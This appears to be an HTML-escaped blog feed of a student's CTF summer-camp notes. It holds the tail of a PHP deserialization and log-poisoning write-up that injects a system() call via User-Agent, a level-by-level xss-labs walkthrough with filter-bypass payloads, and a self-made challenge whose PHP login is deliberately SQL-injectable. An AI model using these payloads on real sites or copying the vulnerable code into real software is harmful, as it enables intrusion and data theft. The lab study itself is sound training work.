class="hljs-title">PageModel</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;file);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>由源码可知，在页面刷新会发送Cookie，内容会将要打开的文件序列化后再base64加密，无过滤<br>1.对Cookie解码，修改读取文件为“/etc/passwd”<br>2.发现用户nginx，修改读取文件“/var/log/nginx/access.log”读取日志文件<br>3.发现日志文件用户记录请求头信息（User-Agent），修改为<code>&lt;?php system(&#39;ls /&#39;); ?&gt;</code>注入命令<br>4.发现flag文件，再次修改请求头注入读取flag的命令即可<br>··············分割线·······················<br>wp:<a href="https://blog.csdn.net/qq_40952713/article/details/119795157">https://blog.csdn.net/qq_40952713/article/details/119795157</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/7/21：夏令营week2记录:xsslab</title>
    <link href="/2023/07/21/xsslab/"/>
    <url>/2023/07/21/xsslab/</url>
    
    <content type="html"><![CDATA[<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> &quot;  &#x27;<span class="hljs-attr">Oonn</span>&gt;</span> 可以用来测闭合<br></code></pre></td></tr></table></figure><h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p>将上面的test改为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h3><p>检测搜索框内为双引号闭合</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h3><p>“&gt;”被替换了</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">keyword</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27; onclick=&#x27;</span>alert(<span class="hljs-number">1</span>) 补全标签<br></code></pre></td></tr></table></figure><h3 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h3><p>查看源码如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;keyword&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;script &quot;</span> &#x27;<span class="hljs-attr">oonn</span>&quot;=<span class="hljs-string">&quot;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>双引号闭合</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">keyword</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&quot; onclick=&quot;</span>alert(<span class="hljs-number">1</span>) 补全标签<br></code></pre></td></tr></table></figure><h3 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h3><p>关键词过滤</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&lt;input name=<span class="hljs-string">&quot;keyword&quot;</span> value=<span class="hljs-string">&quot;&lt;scr_ipt &quot;</span> <span class="hljs-symbol">&#x27;oo_nn</span>=<span class="hljs-string">&quot;&quot;</span>&gt;<br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">keyword</span>=<span class="hljs-string">&quot;&gt;&lt;a href=&quot;</span>javascript:alert(1)&quot;<br></code></pre></td></tr></table></figure><p>点一下下面的蓝色连接即可</p><h3 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h3><p>在上一题基础上有了更多过滤</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&lt;a hr_ef=<span class="hljs-string">&quot;javascript:alert(1)&quot;</span> <span class="hljs-string">&quot;=&quot;&quot;&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">keyword</span>=<span class="hljs-string">&quot;&gt;&lt;a hRef=&quot;</span>javascript:alert(1)&quot;<br></code></pre></td></tr></table></figure><p>？上一题过滤大小写这题不过滤？</p><h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>似乎删掉了关键字</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">&lt;<span class="hljs-keyword">input</span> name=<span class="hljs-string">&quot;keyword&quot;</span> value=<span class="hljs-string">&quot;&lt; &quot;</span> &#x27;<span class="hljs-keyword">on</span>=<span class="hljs-string">&quot;&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>onclick删了on,过滤了但没完全过滤（</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">keyword</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&quot; oonnclick=&quot;</span>alert(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h3><p>应该还是关键词过滤</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&lt;scr_ipt &quot;</span>  &#x27;<span class="hljs-attr">oo_nn</span>&gt;</span>&quot;&gt;友情链接<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>大小写绕过无效，自动转换为小写<br>可以编码绕过</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode">&amp;<span class="hljs-attr">#x6</span>A;&amp;<span class="hljs-attr">#x61</span>;&amp;<span class="hljs-attr">#x76</span>;&amp;<span class="hljs-attr">#x61</span>;&amp;<span class="hljs-attr">#x73</span>;&amp;<span class="hljs-attr">#x63</span>;&amp;<span class="hljs-attr">#x72</span>;&amp;<span class="hljs-attr">#x69</span>;&amp;<span class="hljs-attr">#x70</span>;&amp;<span class="hljs-attr">#x74</span>;&amp;<span class="hljs-attr">#x3</span>A;&amp;<span class="hljs-attr">#x61</span>;&amp;<span class="hljs-attr">#x6</span>C;&amp;<span class="hljs-attr">#x65</span>;&amp;<span class="hljs-attr">#x72</span>;&amp;<span class="hljs-attr">#x74</span>;&amp;<span class="hljs-attr">#x28</span>;&amp;<span class="hljs-attr">#x31</span>;&amp;<span class="hljs-attr">#x29</span>;<br>以上字符串对javascript:alert<span class="hljs-comment">(1)</span>进行ascii编码<br></code></pre></td></tr></table></figure><h3 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;keyword&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;&lt;script &amp;quot;  &#x27;oonn&gt;&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;添加友情链接&quot;</span>&gt;<br><br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;您的链接不合法？有没有！&quot;</span>&gt;友情链接&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>？不太对劲，百度下源码<br>要加个http://，剩下与第8题一样<br>只要有这个字段就行</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs clean">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;(<span class="hljs-string">&#x27;http://&#x27;</span>)<br>刚开始还不知道拿这个http咋办，结果百度只要扔在后面就行<br></code></pre></td></tr></table></figure><h3 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h3><p>随便扔个关键字进去没反应<br>F12</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;t_link&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;t_history&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>url里的keyword估计啥用没有，再扔几下</p><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scilab">&lt;input name=<span class="hljs-string">&quot;t_sort&quot;</span> value=<span class="hljs-string">&quot;script &quot;</span> <span class="hljs-string">&#x27;oonn&quot;</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">t_sort</span>=<span class="hljs-string">&quot; onclick=&#x27;alert(1)&#x27; type=&quot;</span>text<br></code></pre></td></tr></table></figure><p>关键应该就是type把hidden改掉</p><h3 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h3><p>把上一题payload扔进去</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;t_sort&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">onclick</span>=<span class="hljs-string">&#x27;alert(1)&#x27;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>试了半天都差不多这样，麻<br>查了源码是referer请求头注入<br>题目好像有提示我傻了<br>把上一题的payload扔到referer里就行</p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h3><p>又是请求头</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;t_ua&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>？服务器拒绝连接太6了<br>跳了不知道什么情况</p><h3 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h3><p>这题改cookie</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;input <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;t_cook&quot;</span> <span class="hljs-attribute">value</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>emm还要添个user</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">user</span><span class="hljs-operator">=</span><span class="hljs-string">&quot; onclick=&#x27;alert(1)&#x27; type=&quot;</span>text<br></code></pre></td></tr></table></figure><h3 id="level-14-（写不出来）"><a href="#level-14-（写不出来）" class="headerlink" title="level 14 （写不出来）"></a>level 14 （写不出来）</h3><p>需要用到这个网站：<a href="http://ww1.exifviewer.org/">http://ww1.exifviewer.org/</a> 需要梯子</p><p>查了下解法：<br>1.查看源码是iframe框，src到上面的网站<br>2.burp抓包请求，返回有字段X-Frame-Options:SAMEORIGIN（我抓了，没有，可能是我的问题），表示该页面要在相同域名的iframe中展示，修改为：X-Frame-Options:ALLOW-FROM http://…/xss/level14.php<br>3.这个网站可以从任意图像文件提取元数据，往文件写入xss payload<br>4.使用火狐firebug将scrolling=”no”改为yes会出现滚动条<br>5.win7修改图片属性可直接修改EXIF的值<br>6.payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#x27;&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(document.domain)</span>&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><p>在上传过程不断修改返回包的X-Frame-Options字段</p><p>比前面的有趣，虽然我肯定不会写</p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level 15"></a>level 15</h3><p>…<br>后面都404了<br>先这样了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2023/07/15：夏令营week1记录:出题</title>
    <link href="/2023/07/16/week1plus/"/>
    <url>/2023/07/16/week1plus/</url>
    
    <content type="html"><![CDATA[<p><del>目前应该还没法用</del><br><del>参考（照搬了不少其实）了大佬的代码终于正常运行了，代码的问题估计比代码还多</del><br>还是有不少语法错误，这次真能用了<br>结构：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sqltry/<br>$ ├── docker-compose.yml<br>$ ├── Dockerfile<br>$ └── web<br>$      ├── db.sql<br>$      └── index.php  <br></code></pre></td></tr></table></figure><p>index.php:</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">        veryeasysql</span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;./index.css&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"><span class="hljs-selector-tag">body</span>&#123;<span class="hljs-attribute">height</span>:<span class="hljs-number">100%</span>&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;index_01&quot;</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:100%;height:100;&quot;</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">table</span> <span class="hljs-attr">width</span>=<span class="hljs-string">350</span> <span class="hljs-attr">height</span>=<span class="hljs-string">230</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;index_table&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span> =<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;index.php&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;check&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-size: 25px;&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-size: 35px;&quot;</span>&gt;</span>查询<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-size: 25px;&quot;</span>&gt;</span>账号<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;uid&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;请输入账号&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:180px;font-size: 20px;border-radius: 8px;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;font-size: 25px;&quot;</span>&gt;</span>密码<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;请输入密码&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:180px;font-size: 20px;border-radius: 8px;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">    </span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"></span><br><span class="language-xml"></span><span class="language-php"><span class="hljs-meta">&lt;?php</span></span><br><span class="language-php"><span class="hljs-title function_ invoke__">session_start</span>();</span><br><span class="language-php"><span class="hljs-variable">$id</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;uid&#x27;</span>];</span><br><span class="language-php"><span class="hljs-variable">$password</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];</span><br><span class="language-php">    </span><br><span class="language-php"><span class="hljs-variable">$conn</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;root&quot;</span>,<span class="hljs-string">&quot;kali&quot;</span>);</span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$conn</span>-&gt;connect_error)&#123;</span><br><span class="language-php">        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;数据库连接失败&quot;</span>.<span class="hljs-variable">$conn</span>-&gt;connect_error);</span><br><span class="language-php">    &#125;</span><br><span class="language-php"></span><br><span class="language-php"><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;select * from users where username=&#x27;<span class="hljs-subst">$id</span>&#x27; and password=&#x27;<span class="hljs-subst">$password</span>&#x27;&quot;</span>;</span><br><span class="language-php"><span class="hljs-keyword">print</span>(<span class="hljs-variable">$sql</span>);</span><br><span class="language-php"><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$sql</span>);</span><br><span class="language-php"><span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>(<span class="hljs-variable">$result</span>);</span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$id</span> == <span class="hljs-string">&quot;&quot;</span> || <span class="hljs-variable">$password</span> == <span class="hljs-string">&quot;&quot;</span>)&#123;</span><br><span class="language-php">    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;账号密码不能为空&quot;</span>;</span><br><span class="language-php">    <span class="hljs-keyword">exit</span>;</span><br><span class="language-php">&#125;</span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$result</span>)&#123;</span><br><span class="language-php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>)&#123;</span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;password:&#x27;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>];</span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="language-php">        <span class="hljs-comment">// echo &quot;password:&quot;.$row[&#x27;password&#x27;];</span></span><br><span class="language-php">&#125;<span class="hljs-keyword">else</span>&#123;</span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;账号不存在或密码错误&quot;</span>;</span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="language-php">        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="language-php">    &#125;</span><br><span class="language-php">&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;出错:&quot;</span>.<span class="hljs-variable">$conn</span>-&gt;error;</span><br><span class="language-php"><span class="hljs-meta">?&gt;</span></span><br></code></pre></td></tr></table></figure><p>docker-compose.yml:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">version: <span class="hljs-string">&quot;3&quot;</span><br>services:<br>  web:<br>    build: .<br>    image: sqli<br>    ports:<br>      - <span class="hljs-string">&quot;400:80&quot;</span><br>    deploy:<br>      resources:<br>        limits:<br>          cpus: <span class="hljs-string">&#x27;0.50&#x27;</span><br>          memory: 512M<br></code></pre></td></tr></table></figure><p>Dockerfile:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">FROM ctfhub/base_web_nginx_mysql_php_74<br><br>COPY web /var/www/html<br><br>RUN sh -c <span class="hljs-string">&#x27;mysqld_safe &amp;&#x27;</span> \<br>    &amp;&amp; <span class="hljs-built_in">sleep</span> 5s \<br>    &amp;&amp; mysql -uroot -proot -e <span class="hljs-string">&quot;source /var/www/html/db.sql&quot;</span> \<br>    &amp;&amp; <span class="hljs-built_in">chown</span> -R www-data:www-data /var/www/html<br></code></pre></td></tr></table></figure><p>db.sql:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span 